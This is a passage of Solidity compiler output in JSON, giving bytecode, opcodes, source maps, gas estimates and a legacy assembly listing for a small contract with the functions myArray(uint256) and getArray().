SWAP1 DUP1 DUP4 GT PUSH2 0x137 JUMPI JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEC DUP14 0x29 CALLER 0xD3 0x26 0xCD SHL OR 0xD6 0xC4 PUSH25 0x4AA8E387FFA1617F1CDC04320364B3B97698A2EC64736F6C63 NUMBER STOP MOD MOD STOP CALLER ",
							"sourceMap": "9000:1083:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;9000:1083:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c8063cc3e57d91461003b578063d504ea1d1461007d575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100dc565b6040518082815260200191505060405180910390f35b6100856100fd565b6040518080602001828103825283818151815260200191508051906020019060200280838360005b838110156100c85780820151818401526020810190506100ad565b505050509050019250505060405180910390f35b600081815481106100e957fe5b906000526020600020016000915090505481565b6060600080548060200260200160405190810160405280929190818152602001828054801561014b57602002820191906000526020600020905b815481526020019060010190808311610137575b505050505090509056fea2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCC3E57D9 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD504EA1D EQ PUSH2 0x7D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xDC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x85 PUSH2 0xFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH1 0x20 MUL DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xC8 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAD JUMP JUMPDEST POP POP POP POP SWAP1 POP ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0xE9 JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD DUP1 ISZERO PUSH2 0x14B JUMPI PUSH1 0x20 MUL DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 ADD SWAP1 DUP1 DUP4 GT PUSH2 0x137 JUMPI JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEC DUP14 0x29 CALLER 0xD3 0x26 0xCD SHL OR 0xD6 0xC4 PUSH25 0x4AA8E387FFA1617F1CDC04320364B3B97698A2EC64736F6C63 NUMBER STOP MOD MOD STOP CALLER ",
							"sourceMap": "9000:1083:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;9000:1083:4;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;9055:21:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;9055:21:4;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;9995:85;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;9995:85:4;;;;;;;;;;;;;;;;;9055:21;;;;;;;;;;;;;;;;;;;;;;;;;:::o;9995:85::-;10036:13;10067:7;10060:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;9995:85;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "79000",
								"executionCost": "129",
								"totalCost": "79129"
							},
							"external": {
								"getArray()": "infinite",
								"myArray(uint256)": "1958"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 9000,
									"end": 10083,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033",
									".code": [
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "CC3E57D9"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH",
											"source": 4,
											"value": "D504EA1D"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 9000,
											"end": 10083,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "tag",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MUL",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "12"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "13"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "INVALID",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "tag",
											"source": 4,
											"value": "13"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "KECCAK256",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 9055,
											"end": 9076,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "tag",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 10036,
											"end": 10049,
											"name": "PUSH",
											"source": 4,
											"value": "60"
										},
										{
											"begin": 10067,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MUL",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
